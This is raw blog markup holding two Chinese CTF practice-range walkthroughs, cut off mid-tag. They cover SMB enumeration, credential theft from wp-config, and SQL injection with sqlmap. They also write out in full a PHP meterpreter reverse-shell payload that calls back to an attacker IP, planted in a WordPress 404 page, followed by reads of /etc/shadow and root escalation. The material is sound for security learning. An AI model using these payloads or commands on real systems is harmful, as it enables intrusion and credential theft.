loading="lazy"></p><h2 id="分析探测结果"><a href="#分析探测结果" class="headerlink" title="分析探测结果"></a>分析探测结果</h2><p>每一个服务对应计算机的一个端口，用来进行通信。常用端口<code>0~1023</code>在扫描结果中查找特殊端口<br>老规矩，针对特殊端口进行探测，尤其对开放大端口的http服务进行排查。</p><h2 id="针对SMB协议弱点分析"><a href="#针对SMB协议弱点分析" class="headerlink" title="针对SMB协议弱点分析"></a>针对SMB协议弱点分析</h2><ol><li>针对SMB协议，使用空口令，弱口令尝试登录，并查看敏感文件，下载查看；</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient <span class="literal">-L</span> [<span class="type">ip</span>]</span><br></pre></td></tr></table></figure><p>列出该IP分享的所有目录以及链接<br><img src="https://img-blog.csdnimg.cn/20200717112451203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这里使用的是空密码（直接敲回车即可）‘<br>发现了信息：<code>print$</code>这个是共享的打印机、<code>share$</code>共享一个文件夹、<code>IPC$</code>空链接（不需要用户名就可以登录web服务器）。<br>然后挨个查看就行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient <span class="string">&#x27;\\[ip]\print$&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200717113216834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>依旧使用的空密码，发现是失败了。无法连接。<br>开始下一个<br><img src="https://img-blog.csdnimg.cn/20200717113333429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>依旧空密码，成功连接。可以执行一些命令。比如<code>ls</code><br>然后查看下一个(先全部查看完毕在进行更深一步的探测)<br><img src="https://img-blog.csdnimg.cn/20200717113553126.png" alt="m0re" loading="lazy"><br>同样可以登录到smb服务，可以看到空连接里是没有东西的。直接退出！</p><p>刚才在<code>share$</code>的共享文件夹中发现信息，所以再去到<code>share$</code>中进一步获取信息。<br>使用get下载敏感文件进行查看。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get deets.txt </span><br></pre></td></tr></table></figure><p>下载查看<code>deets.txt</code><br><img src="https://img-blog.csdnimg.cn/20200717123635987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>记住这个密码。<br>浏览查看到wordpress文件夹<br><img src="https://img-blog.csdnimg.cn/20200717124516314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>看到一堆文件，需要找的是它的配置文件，wordpress的配置文件一般是有用户名和密码的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get wp-config.php</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200717150219372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>得到了MySQL的用户名和密码分别是：<code>Admin</code>和<code>TogieMYSQL12345^^</code><br>之前扫描端口，室友MySQL服务的，在3306端口。所以可以尝试一下远程登录MySQL看看能否成功登录。<br><img src="https://img-blog.csdnimg.cn/20200717150653891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看出是无法登录的，所以再另想办法。<br>还有个ssh服务开启，尝试利用ssh服务登录服务器<br><img src="https://img-blog.csdnimg.cn/2020071715104458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>密码还用的是刚才那个，但是无法登录。密码不正确！</p><h2 id="针对SMB协议远程溢出漏洞进行分析"><a href="#针对SMB协议远程溢出漏洞进行分析" class="headerlink" title="针对SMB协议远程溢出漏洞进行分析"></a>针对SMB协议远程溢出漏洞进行分析</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit samba版本号</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020071715144087.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>版本号前面已经查询过了。<br>就是上面这张图显示的，。<br><img src="https://img-blog.csdnimg.cn/20200717151724376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>还是没有可利用的信息。</p><h2 id="针对HTTP协议弱点分析"><a href="#针对HTTP协议弱点分析" class="headerlink" title="针对HTTP协议弱点分析"></a>针对HTTP协议弱点分析</h2><ol><li>浏览器查看网站</li><li>使用dirb nikto探测</li><li>寻找突破点，目标登录后台，上传webshell<br><img src="https://img-blog.csdnimg.cn/20200717152327212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>扫差不多就可以停了，向上看，可以看到有wordpress中的<code>wp-admin</code><br>然后尝试访问，在浏览器中访问此链接<code>192.168.40.146/wordpress/wp-admin/</code><br><img src="https://img-blog.csdnimg.cn/20200717152512212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>后台登录页面，还记得刚才得到的用户名和密码吗，就是它<br><img src="https://img-blog.csdnimg.cn/20200717152713787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以成功登录了<br><img src="https://img-blog.csdnimg.cn/2020071715275938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>既然已经登录进去了，就可以上传我们的webshell了。<br>下面制作webshell<h2 id="制作webshell"><a href="#制作webshell" class="headerlink" title="制作webshell"></a>制作webshell</h2>终端执行<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> php/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">40.132</span> lport=<span class="number">4444</span> <span class="operator">-f</span> raw</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20200717153328145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>记住从注释符后面开始复制，不要将注释符也复制进去</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/**/</span> error_reporting(<span class="number">0</span>); $ip = <span class="string">&#x27;192.168.40.132&#x27;</span>; $port = <span class="number">4444</span>; <span class="keyword">if</span> (($f = <span class="string">&#x27;stream_socket_client&#x27;</span>) &amp;&amp; is_callable($f)) &#123; $s = $f(<span class="string">&quot;tcp://&#123;$ip&#125;:&#123;$port&#125;&quot;</span>); $s_type = <span class="string">&#x27;stream&#x27;</span>; &#125; <span class="keyword">if</span> (!$s &amp;&amp; ($f = <span class="string">&#x27;fsockopen&#x27;</span>) &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = <span class="string">&#x27;stream&#x27;</span>; &#125; <span class="keyword">if</span> (!$s &amp;&amp; ($f = <span class="string">&#x27;socket_create&#x27;</span>) &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); <span class="keyword">if</span> (!$res) &#123; <span class="keyword">die</span>(); &#125; $s_type = <span class="string">&#x27;socket&#x27;</span>; &#125; <span class="keyword">if</span> (!$s_type) &#123; <span class="keyword">die</span>(<span class="string">&#x27;no socket funcs&#x27;</span>); &#125; <span class="keyword">if</span> (!$s) &#123; <span class="keyword">die</span>(<span class="string">&#x27;no socket&#x27;</span>); &#125; <span class="keyword">switch</span> ($s_type) &#123; <span class="keyword">case</span> <span class="string">&#x27;stream&#x27;</span>: $len = fread($s, <span class="number">4</span>); <span class="keyword">break</span>; <span class="keyword">case</span> <span class="string">&#x27;socket&#x27;</span>: $len = socket_read($s, <span class="number">4</span>); <span class="keyword">break</span>; &#125; <span class="keyword">if</span> (!$len) &#123; <span class="keyword">die</span>(); &#125; $a = unpack(<span class="string">&quot;Nlen&quot;</span>, $len); $len = $a[<span class="string">&#x27;len&#x27;</span>]; $b = <span class="string">&#x27;&#x27;</span>; <span class="keyword">while</span> (strlen($b) &lt; $len) &#123; <span class="keyword">switch</span> ($s_type) &#123; <span class="keyword">case</span> <span class="string">&#x27;stream&#x27;</span>: $b .= fread($s, $len-strlen($b)); <span class="keyword">break</span>; <span class="keyword">case</span> <span class="string">&#x27;socket&#x27;</span>: $b .= socket_read($s, $len-strlen($b)); <span class="keyword">break</span>; &#125; &#125; $GLOBALS[<span class="string">&#x27;msgsock&#x27;</span>] = $s; $GLOBALS[<span class="string">&#x27;msgsock_type&#x27;</span>] = $s_type; <span class="keyword">if</span> (extension_loaded(<span class="string">&#x27;suhosin&#x27;</span>) &amp;&amp; ini_get(<span class="string">&#x27;suhosin.executor.disable_eval&#x27;</span>)) &#123; $suhosin_bypass=create_function(<span class="string">&#x27;&#x27;</span>, $b); $suhosin_bypass(); &#125; <span class="keyword">else</span> &#123; <span class="keyword">eval</span>($b); &#125; <span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>在桌面创建一个新文件将内容复制进去就行。<br>命令可使用gedit。由于我的kali没装gedit，所以可以装一下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gedit</span><br></pre></td></tr></table></figure><p>开始监听此端口<br>打开metasploit这个工具<br>使用<code>use exploit/multi/handler </code>模块<br>设置payload:<code>set payload php/meterpreter/reverse_tcp</code><br><img src="https://img-blog.csdnimg.cn/20200717160457989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>最后开启本地监听直接<code>run</code></p><h2 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h2><p>使用找到的敏感信息登录系统后台，上传webshell。执行webshell（访问具有webshell的PHP页面）<br>获得反弹的shell<br>wordpress上传点：<code>theme 404.php</code><br>执行：<code>http://靶场IP/wordpress/wp-content/themes/twentyfifteen/404.php</code><br><img src="https://img-blog.csdnimg.cn/20200717161347740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后进行上传<br><img src="https://img-blog.csdnimg.cn/20200717161520327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>会有提示上传成功的<br><img src="https://img-blog.csdnimg.cn/20200717161554354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后访问一个不存在的页面让其返回404页面。就可以了，上面我已经写到了那个URL，可以访问那个<br><img src="https://img-blog.csdnimg.cn/20200717162132461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个时候应该已经监听到了，回去查看一下<br><img src="https://img-blog.csdnimg.cn/20200717162214246.png" alt="m0re" loading="lazy"><br>可以看到反弹shell已经成功了。<br><img src="https://img-blog.csdnimg.cn/20200717162349130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>还能执行一些命令。</p><h2 id="查找flag信息"><a href="#查找flag信息" class="headerlink" title="查找flag信息"></a>查找flag信息</h2><p>优化终端：<code>python -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;</code><br>查找敏感信息，提升root权限，查看flag值。<br>查看用户名等信息<code>cat /etc/passwd</code><br>找home字眼，找对应的用户进行提权<br><img src="https://img-blog.csdnimg.cn/20200717163347975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>切换<code>togie</code>用户，<code>su - togie</code>需要密码，前面还有个密码，就是在那个deets.txt文件中发现的<code>12345</code><br>然后查看该用户可以执行的权限<code>sudo l</code>，然后看到一些可以执行命令的安全目录<br><img src="https://img-blog.csdnimg.cn/20200717163753494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>使用<code>sudo su</code>提升到root权限<br>然后就是找flag了。不出意外都在root根目录下<br><img src="https://img-blog.csdnimg.cn/20200717164231641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>只不过我的这个有些奇怪。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>到这里就结束了。总结一下：<br>这个靶场系列主要是信息收集，还有对各个服务的弱点分析。<br>学会了如何制作自己的webshell。利用webshell等一些列知识。<br>还是信息的收集和分析最重要。<br>还有就是对metasploit这个工具更加熟悉了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF靶场系列————POST类型SQL注入利用获取主机root权限</title>
      <link href="/2020/08/23/CTF%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94POST%E7%B1%BB%E5%9E%8BSQL%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%8B%BF%E5%88%B0%E4%B8%BB%E6%9C%BAroot%E6%9D%83%E9%99%90/"/>
      <url>/2020/08/23/CTF%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94POST%E7%B1%BB%E5%9E%8BSQL%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%8B%BF%E5%88%B0%E4%B8%BB%E6%9C%BAroot%E6%9D%83%E9%99%90/</url>
      
        <content type="html"><![CDATA[<p>前言：任何一个位置都可能是注入点，比如url中，以及http报文中；</p><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>攻击机：<code>10.0.2.4</code><br>靶场机器：<code>10.0.2.15</code><br>这个靶场的IP地址啊，我又搞了一天。玩这个真是让人没脾气！<br>由于这个<br><img src="https://img-blog.csdnimg.cn/20200731184052676.png" alt="m0re" loading="lazy"><br>导入到VM里面会出错<img src="https://img-blog.csdnimg.cn/20200813133344391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>所以我安装到了virtual box当中。靶场安装就这个没意外。但是IP地址就有问题了。探测不到，kali是在VM中，之前也遇到过这个问题，已经解决，但是这一次，用以前的方法解决不了了。以前的方法请参考我的博客——🔑<a href="https://blog.csdn.net/qq_45836474/article/details/106460846">https://blog.csdn.net/qq_45836474/article/details/106460846</a><br>这一次用上次的方法不管用了。于是我想起来之前想过弄两台kali，正好这次可以用到，就新安装了一个kali在virtual box上。这个过程也是很艰辛。直接导入虚拟机的，在kali的官网下载镜像包。<a href="https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/">https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/</a><br>然后就是一个问题了，下载贼慢。<img src="https://img-blog.csdnimg.cn/20200731185550752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>相信大家都有办法。🐶🐶<br>然后问题来了，<br>使用netdiscover扫描不到virtualbox搭建的靶机！这个我找了找，发现有个师傅在社区提这个这个问题，但是没有得到解决。<a href="https://bbs.csdn.net/topics/392861693?list=75554659">使用netdiscover扫描不到virtualbox搭建的靶机！求助</a>我们遇到的问题一模一样。<br>下面我分享一下我的办法。<br>打开主页面顶部的管理——全局设定<br>然后选到网络，就会有这样的界面，点击箭头位置增加一个network<br><img src="https://img-blog.csdnimg.cn/20200731213444136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>点击OK。<br>然后设置kali和靶场机器的网络连接方式<br><img src="https://img-blog.csdnimg.cn/20200731213708553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>选择net网络。下面也选择好刚增加的那一个，同样的靶场机器进行同样的设置。然后再次进行探测。<br><img src="https://img-blog.csdnimg.cn/20200731213944810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>终于看到我想看到的样子了<br><img src="https://img-blog.csdnimg.cn/20200731214048603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h1 id="进行实验"><a href="#进行实验" class="headerlink" title="进行实验"></a>进行实验</h1><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p>扫描主机开放的全部端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -p- 10.0.2.15</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020073121490536.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看出靶场开放的端口有三个，<code>80、443、8080</code><br>快速扫描主机的全部信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -v 10.0.2.15</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200731215252259.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看到80端口开启的http服务的版本信息等等<br>然后对80端口的http服务进行敏感信息挖掘<br>使用nikto或者dirb进行探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nikto -host http://10.0.2.15</span><br><span class="line">dirb http://10.0.2.15</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200731215920590.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>探测到一些敏感信息，<code>login.php</code>登录界面和<code>phpmyadmin</code><br>访问查看信息，<br><img src="https://img-blog.csdnimg.cn/20200731220321252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>一般还可能会在网页源代码中隐藏一些信息。<br>login.php界面是个登录框，<br><img src="https://img-blog.csdnimg.cn/20200731223046214.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>看到框，就猜想是否可能存在SQL注入和xss<br>先将信息全部扫描一遍在做深入探测。<br>phpmyadmin则是普通的mysql的管理登录页面，而且弱口令尝试一遍是不可以登录成功的。<br><img src="https://img-blog.csdnimg.cn/20200731220629883.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>同时，dirb也扫描出很多敏感信息，一一访问查看敏感信息。<br><img src="https://img-blog.csdnimg.cn/20200731221018229.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>8080端口开放的也是http服务，所以也同样使用nikto和dirb进行扫描<br>查看敏感信息<br><img src="https://img-blog.csdnimg.cn/20200801011324946.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>发现了wordpress目录，访问后发现是一个普通的wordpress界面，大致浏览一遍应该是一个个人的网站。<br><img src="https://img-blog.csdnimg.cn/20200731221540726.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>没有发现什么其他的敏感信息。</p><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>使用Owasp-zap漏洞扫描器进行漏洞扫描<br><img src="https://img-blog.csdnimg.cn/20200731223207137.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>先对80端口进行探测<br><img src="https://img-blog.csdnimg.cn/202007312232527.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>没有发现高危漏洞，在扫描一下8080端口<br><img src="https://img-blog.csdnimg.cn/20200731223339192.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>依旧是没有发现什么高危的漏洞。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>信息探测基本完成，现在对探测到的信息进行利用，查看可利用的信息进行深入研究。<br>mysql的管理界面目前没有头绪，看登录框吧，尝试进行SQL注入。<br>可以使用sqlmap进行注入<br>首先抓取对应数据包，使用burpsuite截获数据包<br>开启代理，抓包。<br><img src="https://img-blog.csdnimg.cn/20200731224258411.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后将返回的数据包复制出来，在桌面创建一个<code>request.raw</code><br>将内容粘贴进去保存。<br><img src="https://img-blog.csdnimg.cn/20200731224554371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>使用sqlmap进行注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r request.raw <span class="comment">--level 5 --risk 3 --dbs --dbms mysql --batch</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020073123190326.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>数据库全部爆破出来了。<br>然后就慢慢来吧。<br>发现那个<code>wordpress8080</code>数据库是wordpress的，所以可以爆出它的值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r request.raw <span class="comment">--level 5 --risk 3 -D &quot;wordpress8080&quot; --tables --dbms mysql --batch</span></span><br><span class="line">sqlmap -r request.raw <span class="comment">--level 5 --risk 3 -D &quot;wordpress8080&quot; -T &quot;users&quot; --columns --dbms mysql --batch</span></span><br><span class="line">sqlmap -r request.raw <span class="comment">--level 5 --risk 3 -D &quot;wordpress8080&quot; -T &quot;users&quot; -C username,password --dump --dbms mysql --batch</span></span><br></pre></td></tr></table></figure><p>最后得到了wordpress的登录用户名和密码<br><img src="https://img-blog.csdnimg.cn/20200801000013675.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>登录wordpress，一般wordpress的登录点是<code>wp-login.php</code><br><img src="https://img-blog.csdnimg.cn/20200801000513685.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>成功登录，然后找到404的界面代码。如下：<br><img src="https://img-blog.csdnimg.cn/20200801000818165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="上传webshell获取控制权"><a href="#上传webshell获取控制权" class="headerlink" title="上传webshell获取控制权"></a>上传webshell获取控制权</h2><p>获取shell的位置在<code>/usr/share/webshells/php</code><br><img src="https://img-blog.csdnimg.cn/20200801001405191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>使用这个shell反弹权限<br>copy到桌面<br><img src="https://img-blog.csdnimg.cn/20200801001645536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>只需要将这里改为kali攻击机的IP地址就可以了。<br><img src="https://img-blog.csdnimg.cn/20200801002100912.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后复制出来，粘贴到404界面去。<br><img src="https://img-blog.csdnimg.cn/20200801002313149.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>点击上传就行了。<br><img src="https://img-blog.csdnimg.cn/2020080100240732.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>提示上传成功。<br>启动监听，使用nc进行监听。<br><img src="https://img-blog.csdnimg.cn/20200801002622883.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>访问404的界面<br><code>http://10.0.2.15:8080/wordpress/wp-content/themes/twentythirteen/404.php</code><br>看到浏览器一直在请求，就可以回到终端查看监听状态了。<br><img src="https://img-blog.csdnimg.cn/20200801004147348.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>浏览器一直在不断的请求服务，这个时候webshell已经被执行了。<br>查看监听状况<br><img src="https://img-blog.csdnimg.cn/20200801004239323.jpg" alt="m0re" loading="lazy"><br>进行终端优化<code>python -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><p>查看敏感文件信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shadow</span><br><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200801004825884.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>看最后发现一句话<br>“你偷走了我的文件！没有人进来，也没有人出去！”<br>不管它。flag一般都是在root根目录下。<br>所以需要进行提权<br>不过提权需要密码，先尝试空密码<br><img src="https://img-blog.csdnimg.cn/20200801005153480.jpg" alt="m0re" 